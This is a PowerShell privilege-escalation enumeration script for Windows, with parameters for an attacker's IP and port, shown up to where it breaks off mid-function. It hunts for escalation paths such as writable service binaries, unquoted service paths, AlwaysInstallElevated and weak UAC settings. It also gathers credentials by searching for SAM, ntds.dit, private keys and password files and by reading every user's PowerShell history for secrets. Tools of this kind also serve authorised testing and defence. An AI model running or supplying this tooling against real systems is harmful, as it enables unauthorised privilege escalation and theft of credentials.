<#
.SYNOPSIS
Windows Privilege Escalation Enumeration Tool
.DESCRIPTION
Comprehensive offline-capable privilege escalation enumeration with guided workflow
#>

param(
    [string]$AttackerIP,
    [int]$AttackerPort,
    [string]$OutputPath,
    [switch]$Quick,
    [switch]$Full,
    [switch]$ExportOnly
)

$Global:Results = @{}
$Global:Findings = [System.Collections.ArrayList]::new()
$Global:HighPriority = [System.Collections.ArrayList]::new()

function Get-Input {
    param([string]$Prompt, [string]$Default)
    $response = Read-Host "$Prompt"
    if ([string]::IsNullOrWhiteSpace($response)) { return $Default }
    return $response.Trim()
}

function Add-Finding {
    param([string]$Category, [string]$Description, [string]$Details, [int]$Priority = 3)
    $finding = [PSCustomObject]@{
        Category = $Category
        Description = $Description
        Details = $Details
        Priority = $Priority
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
    [void]$Global:Findings.Add($finding)
    if ($Priority -le 2) { [void]$Global:HighPriority.Add($finding) }
}

function Write-Status {
    param([string]$Message, [string]$Type = "INFO")
    $prefix = switch ($Type) {
        "INFO"    { "[*]" }
        "SUCCESS" { "[+]" }
        "WARNING" { "[!]" }
        "ERROR"   { "[-]" }
        "INPUT"   { "[?]" }
        default   { "[*]" }
    }
    Write-Host "$prefix $Message"
}

function Get-SystemContext {
    Write-Status "Gathering system context..."
    
    $context = @{}
    
    try {
        $context.Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $context.Hostname = $env:COMPUTERNAME
        $context.Domain = $env:USERDOMAIN
        $context.UserProfile = $env:USERPROFILE
        $context.Temp = $env:TEMP
        $context.SystemRoot = $env:SystemRoot
        $context.ProgramFiles = $env:ProgramFiles
        $context.ProgramFilesX86 = ${env:ProgramFiles(x86)}
        $context.IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        $context.Is64Bit = [Environment]::Is64BitOperatingSystem
        $context.PSVersion = $PSVersionTable.PSVersion.ToString()
        
        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
        if ($os) {
            $context.OSName = $os.Caption
            $context.OSVersion = $os.Version
            $context.OSBuild = $os.BuildNumber
            $context.OSArch = $os.OSArchitecture
            $context.InstallDate = $os.InstallDate
            $context.LastBoot = $os.LastBootUpTime
        }
        
        $cs = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
        if ($cs) {
            $context.Manufacturer = $cs.Manufacturer
            $context.Model = $cs.Model
            $context.PartOfDomain = $cs.PartOfDomain
            $context.DomainName = $cs.Domain
        }
    }
    catch {
        $context.Error = $_.Exception.Message
    }
    
    $Global:Results.SystemContext = $context
    return $context
}

function Get-CurrentUserInfo {
    Write-Status "Enumerating current user..."
    
    $userInfo = @{}
    
    try {
        $userInfo.Identity = whoami 2>$null
        $userInfo.Groups = whoami /groups /fo csv 2>$null | ConvertFrom-Csv
        $userInfo.Privileges = whoami /priv /fo csv 2>$null | ConvertFrom-Csv
        
        $enabledPrivs = $userInfo.Privileges | Where-Object { $_.'State' -eq 'Enabled' }
        
        $dangerousPrivs = @(
            'SeImpersonatePrivilege',
            'SeAssignPrimaryTokenPrivilege',
            'SeTcbPrivilege',
            'SeBackupPrivilege',
            'SeRestorePrivilege',
            'SeDebugPrivilege',
            'SeTakeOwnershipPrivilege',
            'SeLoadDriverPrivilege',
            'SeManageVolumePrivilege'
        )
        
        foreach ($priv in $enabledPrivs) {
            $privName = $priv.'Privilege Name'
            if ($privName -in $dangerousPrivs) {
                Add-Finding -Category "Privileges" -Description "Dangerous privilege enabled: $privName" -Details ($priv | Out-String) -Priority 1
            }
        }
        
        $adminGroups = @('Administrators', 'Domain Admins', 'Enterprise Admins', 'Backup Operators', 'Server Operators')
        foreach ($group in $userInfo.Groups) {
            $groupName = $group.'Group Name'
            foreach ($ag in $adminGroups) {
                if ($groupName -like "*$ag*") {
                    Add-Finding -Category "Groups" -Description "Member of privileged group: $groupName" -Details ($group | Out-String) -Priority 1
                }
            }
        }
    }
    catch {
        $userInfo.Error = $_.Exception.Message
    }
    
    $Global:Results.CurrentUser = $userInfo
    return $userInfo
}

function Get-LocalUsers {
    Write-Status "Enumerating local users..."
    
    $users = @{}
    
    try {
        $localUsers = Get-LocalUser -ErrorAction SilentlyContinue
        $users.All = $localUsers | Select-Object Name, Enabled, PasswordRequired, PasswordLastSet, LastLogon, Description
        $users.Enabled = $localUsers | Where-Object { $_.Enabled -eq $true } | Select-Object Name, Description
        $users.Disabled = $localUsers | Where-Object { $_.Enabled -eq $false } | Select-Object Name
        
        foreach ($user in $users.Enabled) {
            if ($user.Name -like "*admin*" -or $user.Name -like "*svc*" -or $user.Name -like "*backup*") {
                Add-Finding -Category "Users" -Description "Interesting user found: $($user.Name)" -Details $user.Description -Priority 2
            }
        }
    }
    catch {
        try {
            $netUsers = net user 2>$null
            $users.NetUserOutput = $netUsers
        }
        catch {
            $users.Error = $_.Exception.Message
        }
    }
    
    $Global:Results.LocalUsers = $users
    return $users
}

function Get-LocalGroups {
    Write-Status "Enumerating local groups..."
    
    $groups = @{}
    
    $interestingGroups = @(
        'Administrators',
        'Remote Desktop Users',
        'Remote Management Users',
        'Backup Operators',
        'Server Operators',
        'Account Operators',
        'DnsAdmins',
        'DHCP Administrators',
        'Hyper-V Administrators'
    )
    
    try {
        $localGroups = Get-LocalGroup -ErrorAction SilentlyContinue
        $groups.All = $localGroups | Select-Object Name, Description
        
        foreach ($grp in $interestingGroups) {
            try {
                $members = Get-LocalGroupMember -Group $grp -ErrorAction SilentlyContinue
                if ($members) {
                    $groups[$grp] = $members | Select-Object Name, PrincipalSource, ObjectClass
                    foreach ($member in $members) {
                        Add-Finding -Category "Groups" -Description "Member of $grp : $($member.Name)" -Details ($member | Out-String) -Priority 2
                    }
                }
            }
            catch { }
        }
        
        foreach ($grp in $localGroups) {
            if ($grp.Name -notin $interestingGroups) {
                try {
                    $members = Get-LocalGroupMember -Group $grp.Name -ErrorAction SilentlyContinue
                    if ($members) {
                        $groups[$grp.Name] = $members | Select-Object Name, PrincipalSource
                    }
                }
                catch { }
            }
        }
    }
    catch {
        try {
            $groups.NetLocalGroup = net localgroup 2>$null
        }
        catch {
            $groups.Error = $_.Exception.Message
        }
    }
    
    $Global:Results.LocalGroups = $groups
    return $groups
}

function Get-NetworkInfo {
    Write-Status "Enumerating network configuration..."
    
    $network = @{}
    
    try {
        $network.IPConfig = Get-NetIPConfiguration -ErrorAction SilentlyContinue | Select-Object InterfaceAlias, IPv4Address, IPv6Address, DNSServer
        $network.Adapters = Get-NetAdapter -ErrorAction SilentlyContinue | Select-Object Name, Status, MacAddress, LinkSpeed
        $network.Routes = Get-NetRoute -ErrorAction SilentlyContinue | Where-Object { $_.NextHop -ne '0.0.0.0' -and $_.NextHop -ne '::' } | Select-Object DestinationPrefix, NextHop, InterfaceAlias
        $network.DNSServers = Get-DnsClientServerAddress -ErrorAction SilentlyContinue | Select-Object InterfaceAlias, ServerAddresses
        $network.ARPTable = Get-NetNeighbor -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Reachable' } | Select-Object IPAddress, LinkLayerAddress, InterfaceAlias
    }
    catch {
        $network.IPConfigLegacy = ipconfig /all 2>$null
        $network.RouteLegacy = route print 2>$null
        $network.ARPLegacy = arp -a 2>$null
    }
    
    try {
        $connections = netstat -ano 2>$null
        $network.ActiveConnections = $connections
        
        $listeningPorts = netstat -an 2>$null | Select-String "LISTENING"
        $network.ListeningPorts = $listeningPorts
        
        foreach ($line in $listeningPorts) {
            if ($line -match ':(\d+)\s+') {
                $port = $matches[1]
                $interestingPorts = @('21','22','23','25','53','80','88','110','135','139','143','389','443','445','464','587','636','993','995','1433','1434','3306','3389','5432','5985','5986','8080','8443')
                if ($port -in $interestingPorts) {
                    Add-Finding -Category "Network" -Description "Interesting port listening: $port" -Details $line -Priority 2
                }
            }
        }
    }
    catch {
        $network.NetstatError = $_.Exception.Message
    }
    
    try {
        $network.Shares = net share 2>$null
        $network.Sessions = net session 2>$null
        $network.NetUse = net use 2>$null
    }
    catch { }
    
    try {
        $network.Hosts = Get-Content "$env:SystemRoot\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue | Where-Object { $_ -notmatch '^\s*#' -and $_ -match '\S' }
    }
    catch { }
    
    $Global:Results.Network = $network
    return $network
}

function Get-InstalledSoftware {
    Write-Status "Enumerating installed software..."
    
    $software = @{}
    
    $regPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    
    $allSoftware = @()
    
    foreach ($path in $regPaths) {
        try {
            $items = Get-ItemProperty $path -ErrorAction SilentlyContinue | 
                Where-Object { $_.DisplayName } |
                Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation
            $allSoftware += $items
        }
        catch { }
    }
    
    $software.Installed = $allSoftware | Sort-Object DisplayName -Unique
    
    $vulnerableSoftware = @(
        '*FileZilla*', '*PuTTY*', '*WinSCP*', '*KeePass*', '*mRemoteNG*',
        '*VNC*', '*TeamViewer*', '*AnyDesk*', '*Remote Desktop*',
        '*XAMPP*', '*WAMP*', '*Apache*', '*nginx*', '*IIS*',
        '*MySQL*', '*PostgreSQL*', '*MSSQL*', '*Oracle*', '*MongoDB*',
        '*Python*', '*Node.js*', '*Java*', '*PHP*',
        '*Git*', '*Visual Studio*', '*Notepad++*', '*Sublime*',
        '*7-Zip*', '*WinRAR*', '*Firefox*', '*Chrome*', '*Edge*',
        '*Slack*', '*Discord*', '*Zoom*', '*Teams*',
        '*Office*', '*Adobe*', '*Foxit*'
    )
    
    foreach ($app in $software.Installed) {
        foreach ($pattern in $vulnerableSoftware) {
            if ($app.DisplayName -like $pattern) {
                Add-Finding -Category "Software" -Description "Interesting software: $($app.DisplayName) v$($app.DisplayVersion)" -Details "Publisher: $($app.Publisher), Location: $($app.InstallLocation)" -Priority 3
                break
            }
        }
    }
    
    $commonPaths = @(
        "$env:ProgramFiles",
        ${env:ProgramFiles(x86)},
        "$env:SystemDrive\Tools",
        "$env:SystemDrive\Apps",
        "$env:USERPROFILE\AppData\Local\Programs"
    )
    
    $software.Directories = @()
    foreach ($path in $commonPaths) {
        if (Test-Path $path) {
            try {
                $dirs = Get-ChildItem $path -Directory -ErrorAction SilentlyContinue | Select-Object Name, FullName, LastWriteTime
                $software.Directories += $dirs
            }
            catch { }
        }
    }
    
    $Global:Results.Software = $software
    return $software
}

function Get-RunningProcesses {
    Write-Status "Enumerating running processes..."
    
    $processes = @{}
    
    try {
        $procs = Get-Process -IncludeUserName -ErrorAction SilentlyContinue | 
            Select-Object Id, ProcessName, UserName, Path, Company, Description |
            Sort-Object ProcessName
        $processes.All = $procs
        
        $systemProcs = @('System', 'smss', 'csrss', 'wininit', 'services', 'lsass', 'svchost', 'dwm', 'explorer', 'RuntimeBroker', 'SearchHost', 'ShellExperienceHost', 'StartMenuExperienceHost', 'TextInputHost', 'conhost', 'dllhost', 'sihost', 'taskhostw', 'ctfmon', 'fontdrvhost', 'WmiPrvSE', 'spoolsv', 'SecurityHealthService', 'MsMpEng', 'NisSrv')
        
        $nonStandard = $procs | Where-Object { $_.ProcessName -notin $systemProcs }
        $processes.NonStandard = $nonStandard
        
        foreach ($proc in $nonStandard) {
            if ($proc.Path -and $proc.Path -notlike "$env:SystemRoot*" -and $proc.Path -notlike "$env:ProgramFiles*" -and $proc.Path -notlike "${env:ProgramFiles(x86)}*") {
                Add-Finding -Category "Processes" -Description "Non-standard process: $($proc.ProcessName)" -Details "Path: $($proc.Path), User: $($proc.UserName)" -Priority 2
            }
        }
    }
    catch {
        try {
            $processes.WMI = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Select-Object ProcessId, Name, ExecutablePath, CommandLine
        }
        catch {
            $processes.Error = $_.Exception.Message
        }
    }
    
    $Global:Results.Processes = $processes
    return $processes
}

function Get-Services {
    Write-Status "Enumerating services..."
    
    $services = @{}
    
    try {
        $allServices = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue
        $services.All = $allServices | Select-Object Name, DisplayName, State, StartMode, PathName, StartName
        
        $services.Running = $allServices | Where-Object { $_.State -eq 'Running' } | Select-Object Name, DisplayName, PathName, StartName
        $services.Stopped = $allServices | Where-Object { $_.State -eq 'Stopped' -and $_.StartMode -ne 'Disabled' } | Select-Object Name, DisplayName, PathName, StartName
        
        foreach ($svc in $allServices) {
            if ($svc.PathName) {
                $cleanPath = $svc.PathName -replace '"', ''
                $cleanPath = ($cleanPath -split ' ')[0]
                
                if ($cleanPath -and (Test-Path $cleanPath -ErrorAction SilentlyContinue)) {
                    try {
                        $acl = Get-Acl $cleanPath -ErrorAction SilentlyContinue
                        foreach ($access in $acl.Access) {
                            if ($access.IdentityReference -match 'Users|Everyone|Authenticated Users' -and $access.FileSystemRights -match 'Write|FullControl|Modify') {
                                Add-Finding -Category "Services" -Description "Writable service binary: $($svc.Name)" -Details "Path: $cleanPath, Rights: $($access.FileSystemRights), Identity: $($access.IdentityReference)" -Priority 1
                            }
                        }
                    }
                    catch { }
                }
                
                if ($svc.PathName -notmatch '^"' -and $svc.PathName -match '\s') {
                    Add-Finding -Category "Services" -Description "Unquoted service path: $($svc.Name)" -Details "Path: $($svc.PathName)" -Priority 1
                }
            }
            
            if ($svc.StartName -and $svc.StartName -notmatch 'LocalSystem|LocalService|NetworkService|NT AUTHORITY') {
                Add-Finding -Category "Services" -Description "Service running as user: $($svc.Name)" -Details "User: $($svc.StartName)" -Priority 2
            }
        }
        
        foreach ($svc in $allServices) {
            if ($svc.PathName) {
                $svcDir = Split-Path $svc.PathName.Trim('"').Split(' ')[0] -Parent -ErrorAction SilentlyContinue
                if ($svcDir -and (Test-Path $svcDir -ErrorAction SilentlyContinue)) {
                    try {
                        $acl = Get-Acl $svcDir -ErrorAction SilentlyContinue
                        foreach ($access in $acl.Access) {
                            if ($access.IdentityReference -match 'Users|Everyone|Authenticated Users' -and $access.FileSystemRights -match 'Write|FullControl|Modify') {
                                Add-Finding -Category "Services" -Description "Writable service directory: $($svc.Name)" -Details "Directory: $svcDir, Rights: $($access.FileSystemRights)" -Priority 1
                            }
                        }
                    }
                    catch { }
                }
            }
        }
    }
    catch {
        $services.Error = $_.Exception.Message
    }
    
    $Global:Results.Services = $services
    return $services
}

function Get-ScheduledTasks {
    Write-Status "Enumerating scheduled tasks..."
    
    $tasks = @{}
    
    try {
        $allTasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.State -ne 'Disabled' }
        $tasks.All = $allTasks | Select-Object TaskName, TaskPath, State, Author
        
        $taskDetails = @()
        foreach ($task in $allTasks) {
            try {
                $info = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath -ErrorAction SilentlyContinue
                $actions = $task.Actions | Select-Object Execute, Arguments, WorkingDirectory
                
                $taskDetails += [PSCustomObject]@{
                    Name = $task.TaskName
                    Path = $task.TaskPath
                    Author = $task.Author
                    RunAs = $task.Principal.UserId
                    RunLevel = $task.Principal.RunLevel
                    Execute = ($actions | ForEach-Object { $_.Execute }) -join '; '
                    Arguments = ($actions | ForEach-Object { $_.Arguments }) -join '; '
                    LastRun = $info.LastRunTime
                    NextRun = $info.NextRunTime
                }
                
                foreach ($action in $actions) {
                    if ($action.Execute) {
                        $exePath = $action.Execute -replace '"', ''
                        if (Test-Path $exePath -ErrorAction SilentlyContinue) {
                            try {
                                $acl = Get-Acl $exePath -ErrorAction SilentlyContinue
                                foreach ($access in $acl.Access) {
                                    if ($access.IdentityReference -match 'Users|Everyone|Authenticated Users' -and $access.FileSystemRights -match 'Write|FullControl|Modify') {
                                        Add-Finding -Category "ScheduledTasks" -Description "Writable task binary: $($task.TaskName)" -Details "Path: $exePath, Rights: $($access.FileSystemRights)" -Priority 1
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }
                
                if ($task.Principal.RunLevel -eq 'Highest' -and $task.Principal.UserId -match 'SYSTEM|Administrator') {
                    Add-Finding -Category "ScheduledTasks" -Description "High privilege task: $($task.TaskName)" -Details "RunAs: $($task.Principal.UserId), Execute: $(($actions | ForEach-Object { $_.Execute }) -join '; ')" -Priority 2
                }
            }
            catch { }
        }
        $tasks.Details = $taskDetails
    }
    catch {
        try {
            $tasks.Schtasks = schtasks /query /fo csv /v 2>$null | ConvertFrom-Csv
        }
        catch {
            $tasks.Error = $_.Exception.Message
        }
    }
    
    $Global:Results.ScheduledTasks = $tasks
    return $tasks
}

function Get-RegistryAutoRuns {
    Write-Status "Enumerating registry autoruns..."
    
    $autoruns = @{}
    
    $autorunKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders",
        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        "HKLM:\SYSTEM\CurrentControlSet\Services"
    )
    
    foreach ($key in $autorunKeys) {
        try {
            if (Test-Path $key) {
                $items = Get-ItemProperty $key -ErrorAction SilentlyContinue
                $autoruns[$key] = $items | Select-Object PSPath, *
                
                $items.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
                    $value = $_.Value
                    if ($value -match '\.exe|\.bat|\.cmd|\.ps1|\.vbs') {
                        $path = ($value -replace '"', '').Split(' ')[0]
                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                            try {
                                $acl = Get-Acl $path -ErrorAction SilentlyContinue
                                foreach ($access in $acl.Access) {
                                    if ($access.IdentityReference -match 'Users|Everyone|Authenticated Users' -and $access.FileSystemRights -match 'Write|FullControl|Modify') {
                                        Add-Finding -Category "AutoRuns" -Description "Writable autorun: $($_.Name)" -Details "Path: $path, Key: $key" -Priority 1
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }
            }
        }
        catch { }
    }
    
    $Global:Results.AutoRuns = $autoruns
    return $autoruns
}

function Get-SensitiveFiles {
    Write-Status "Searching for sensitive files..."
    
    $sensitiveFiles = @{}
    
    $searchPaths = @(
        $env:USERPROFILE,
        "$env:SystemDrive\Users",
        "$env:SystemDrive\inetpub",
        "$env:SystemDrive\xampp",
        "$env:SystemDrive\wamp",
        "$env:ProgramData"
    )
    
    $sensitivePatterns = @(
        '*.kdbx', '*.kdb',
        '*.ppk', '*.pem', '*.key', '*.pfx', '*.p12',
        'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
        '*.config', 'web.config', 'app.config',
        'unattend.xml', 'sysprep.xml', 'sysprep.inf',
        '*.rdp', '*.rdg',
        'password*', 'passwd*', 'credential*', 'secret*', 'cred*',
        '*.bak', '*.backup', '*.old',
        '.htpasswd', '.htaccess',
        '*.sql', '*.sqlite', '*.db',
        'wp-config.php', 'configuration.php', 'config.php',
        '*.ini', 'my.ini', 'my.cnf',
        'SAM', 'SYSTEM', 'SECURITY',
        'ntds.dit',
        'ConsoleHost_history.txt',
        '*.ps1', '*.psm1', '*.psd1'
    )
    
    $foundFiles = @()
    
    foreach ($searchPath in $searchPaths) {
        if (Test-Path $searchPath -ErrorAction SilentlyContinue) {
            foreach ($pattern in $sensitivePatterns) {
                try {
                    $files = Get-ChildItem -Path $searchPath -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue -Force 2>$null | 
                        Select-Object FullName, Length, LastWriteTime, @{N='SizeKB';E={[math]::Round($_.Length/1KB,2)}}
                    if ($files) {
                        $foundFiles += $files
                    }
                }
                catch { }
            }
        }
    }
    
    $sensitiveFiles.Found = $foundFiles | Sort-Object FullName -Unique
    
    foreach ($file in $sensitiveFiles.Found) {
        $priority = 3
        if ($file.FullName -match 'password|credential|secret|\.kdbx|\.ppk|\.pem|id_rsa|SAM|SYSTEM|SECURITY|ntds\.dit') {
            $priority = 1
        }
        elseif ($file.FullName -match 'config|\.ini|\.xml|\.sql|ConsoleHost_history') {
            $priority = 2
        }
        Add-Finding -Category "SensitiveFiles" -Description "Sensitive file found: $(Split-Path $file.FullName -Leaf)" -Details "Path: $($file.FullName), Size: $($file.SizeKB)KB" -Priority $priority
    }
    
    $Global:Results.SensitiveFiles = $sensitiveFiles
    return $sensitiveFiles
}

function Get-PowerShellHistory {
    Write-Status "Checking PowerShell history..."
    
    $psHistory = @{}
    
    try {
        $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath -ErrorAction SilentlyContinue)) {
            $psHistory.CurrentUserHistory = Get-Content $historyPath -ErrorAction SilentlyContinue
            Add-Finding -Category "PowerShell" -Description "PSReadline history found" -Details "Path: $historyPath" -Priority 1
        }
    }
    catch { }
    
    $users = Get-ChildItem "$env:SystemDrive\Users" -Directory -ErrorAction SilentlyContinue
    foreach ($user in $users) {
        $paths = @(
            "$($user.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
            "$($user.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt"
        )
        foreach ($path in $paths) {
            if (Test-Path $path -ErrorAction SilentlyContinue) {
                try {
                    $content = Get-Content $path -ErrorAction SilentlyContinue
                    $psHistory["$($user.Name)_history"] = $content
                    Add-Finding -Category "PowerShell" -Description "PowerShell history for $($user.Name)" -Details "Path: $path, Lines: $($content.Count)" -Priority 1
                    
                    foreach ($line in $content) {
                        if ($line -match 'password|credential|secret|key|token|ConvertTo-SecureString|-Credential') {
                            Add-Finding -Category "PowerShell" -Description "Sensitive command in history" -Details $line -Priority 1
                        }
                    }
                }
                catch { }
            }
        }
    }
    
    $transcriptPaths = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop",
        "$env:SystemDrive\Transcripts",
        "$env:SystemDrive\Users\Public\Transcripts",
        "$env:ProgramData\Transcripts"
    )
    
    foreach ($tPath in $transcriptPaths) {
        if (Test-Path $tPath -ErrorAction SilentlyContinue) {
            try {
                $transcripts = Get-ChildItem $tPath -Filter "*.txt" -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'transcript|PowerShell' }
                foreach ($t in $transcripts) {
                    $psHistory["Transcript_$($t.Name)"] = $t.FullName
                    Add-Finding -Category "PowerShell" -Description "PowerShell transcript found" -Details "Path: $($t.FullName)" -Priority 1
                }
            }
            catch { }
        }
    }
    
    $Global:Results.PowerShellHistory = $psHistory
    return $psHistory
}

function Get-StoredCredentials {
    Write-Status "Checking for stored credentials..."
    
    $credentials = @{}
    
    try {
        $cmdkey = cmdkey /list 2>$null
        $credentials.Cmdkey = $cmdkey
        if ($cmdkey -match 'Target:') {
            Add-Finding -Category "Credentials" -Description "Stored credentials found (cmdkey)" -Details ($cmdkey | Out-String) -Priority 1
        }
    }
    catch { }
    
    $vaultPaths = @(
        "$env:USERPROFILE\AppData\Local\Microsoft\Vault",
        "$env:USERPROFILE\AppData\Roaming\Microsoft\Vault"
    )
    foreach ($vPath in $vaultPaths) {
        if (Test-Path $vPath -ErrorAction SilentlyContinue) {
            $credentials.VaultPath = $vPath
            Add-Finding -Category "Credentials" -Description "Credential Vault found" -Details "Path: $vPath" -Priority 2
        }
    }
    
    $dpapiFolders = @(
        "$env:USERPROFILE\AppData\Roaming\Microsoft\Credentials",
        "$env:USERPROFILE\AppData\Local\Microsoft\Credentials",
        "$env:USERPROFILE\AppData\Roaming\Microsoft\Protect"
    )
    foreach ($dPath in $dpapiFolders) {
        if (Test-Path $dPath -ErrorAction SilentlyContinue) {
            try {
                $files = Get-ChildItem $dPath -Recurse -File -ErrorAction SilentlyContinue
                if ($files) {
                    $credentials["DPAPI_$($dPath.Split('\')[-1])"] = $files | Select-Object FullName, Length, LastWriteTime
                    Add-Finding -Category "Credentials" -Description "DPAPI credentials found" -Details "Path: $dPath, Count: $($files.Count)" -Priority 2
                }
            }
            catch { }
        }
    }
    
    $wifiProfiles = netsh wlan show profiles 2>$null
    if ($wifiProfiles -match 'All User Profile') {
        $credentials.WifiProfiles = $wifiProfiles
        Add-Finding -Category "Credentials" -Description "WiFi profiles found" -Details "Check with: netsh wlan show profile name=PROFILENAME key=clear" -Priority 2
    }
    
    $Global:Results.StoredCredentials = $credentials
    return $credentials
}

function Get-AlwaysInstallElevated {
    Write-Status "Checking AlwaysInstallElevated..."
    
    $aie = @{}
    
    try {
        $hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
        $hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
        
        $aie.HKLM = $hklm.AlwaysInstallElevated
        $aie.HKCU = $hkcu.AlwaysInstallElevated
        
        if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
            Add-Finding -Category "AlwaysInstallElevated" -Description "AlwaysInstallElevated is ENABLED" -Details "Both HKLM and HKCU keys are set to 1 - MSI packages can be installed with SYSTEM privileges" -Priority 1
        }
    }
    catch {
        $aie.Error = "Not configured or access denied"
    }
    
    $Global:Results.AlwaysInstallElevated = $aie
    return $aie
}

function Get-PathHijacking {
    Write-Status "Checking for PATH hijacking opportunities..."
    
    $pathHijack = @{}
    
    try {
        $pathDirs = $env:PATH -split ';'
        $pathHijack.Directories = $pathDirs
        
        $writablePaths = @()
        foreach ($dir in $pathDirs) {
            if ([string]::IsNullOrWhiteSpace($dir)) { continue }
            if (Test-Path $dir -ErrorAction SilentlyContinue) {
                try {
                    $acl = Get-Acl $dir -ErrorAction SilentlyContinue
                    foreach ($access in $acl.Access) {
                        if ($access.IdentityReference -match 'Users|Everyone|Authenticated Users' -and $access.FileSystemRights -match 'Write|FullControl|Modify') {
                            $writablePaths += [PSCustomObject]@{
                                Path = $dir
                                Identity = $access.IdentityReference.ToString()
                                Rights = $access.FileSystemRights.ToString()
                            }
                            Add-Finding -Category "PathHijacking" -Description "Writable PATH directory" -Details "Path: $dir, Identity: $($access.IdentityReference), Rights: $($access.FileSystemRights)" -Priority 1
                        }
                    }
                }
                catch { }
            }
        }
        $pathHijack.WritablePaths = $writablePaths
    }
    catch {
        $pathHijack.Error = $_.Exception.Message
    }
    
    $Global:Results.PathHijacking = $pathHijack
    return $pathHijack
}

function Get-DLLHijacking {
    Write-Status "Checking for DLL hijacking opportunities..."
    
    $dllHijack = @{}
    
    $commonTargets = @(
        "$env:SystemRoot\System32\spool\drivers\color",
        "$env:SystemRoot\Tasks",
        "$env:ProgramData"
    )
    
    $writableDirs = @()
    foreach ($dir in $commonTargets) {
        if (Test-Path $dir -ErrorAction SilentlyContinue) {
            try {
                $acl = Get-Acl $dir -ErrorAction SilentlyContinue
                foreach ($access in $acl.Access) {
                    if ($access.IdentityReference -match 'Users|Everyone|Authenticated Users' -and $access.FileSystemRights -match 'Write|FullControl|Modify') {
                        $writableDirs += [PSCustomObject]@{
                            Path = $dir
                            Identity = $access.IdentityReference.ToString()
                            Rights = $access.FileSystemRights.ToString()
                        }
                    }
                }
            }
            catch { }
        }
    }
    $dllHijack.WritableSystemDirs = $writableDirs
    
    if ($writableDirs.Count -gt 0) {
        Add-Finding -Category "DLLHijacking" -Description "Writable system directories found" -Details ($writableDirs | Format-Table | Out-String) -Priority 2
    }
    
    $Global:Results.DLLHijacking = $dllHijack
    return $dllHijack
}

function Get-UACSettings {
    Write-Status "Checking UAC settings..."
    
    $uac = @{}
    
    try {
        $uacSettings = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue
        
        $uac.EnableLUA = $uacSettings.EnableLUA
        $uac.ConsentPromptBehaviorAdmin = $uacSettings.ConsentPromptBehaviorAdmin
        $uac.ConsentPromptBehaviorUser = $uacSettings.ConsentPromptBehaviorUser
        $uac.PromptOnSecureDesktop = $uacSettings.PromptOnSecureDesktop
        $uac.FilterAdministratorToken = $uacSettings.FilterAdministratorToken
        
        if ($uacSettings.EnableLUA -eq 0) {
            Add-Finding -Category "UAC" -Description "UAC is DISABLED" -Details "EnableLUA = 0" -Priority 1
        }
        elseif ($uacSettings.ConsentPromptBehaviorAdmin -eq 0) {
            Add-Finding -Category "UAC" -Description "UAC set to no prompt for admins" -Details "ConsentPromptBehaviorAdmin = 0 (Elevate without prompting)" -Priority 1
        }
        
        $localAccountFilter = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -ErrorAction SilentlyContinue
        if ($localAccountFilter.LocalAccountTokenFilterPolicy -eq 1) {
            Add-Finding -Category "UAC" -Description "LocalAccountTokenFilterPolicy enabled" -Details "Remote UAC filtering disabled - PTH possible for local admins" -Priority 1
        }
    }
    catch {
        $uac.Error = $_.Exception.Message
    }
    
    $Global:Results.UAC = $uac
    return $uac
}

function Get-AntivirusInfo {
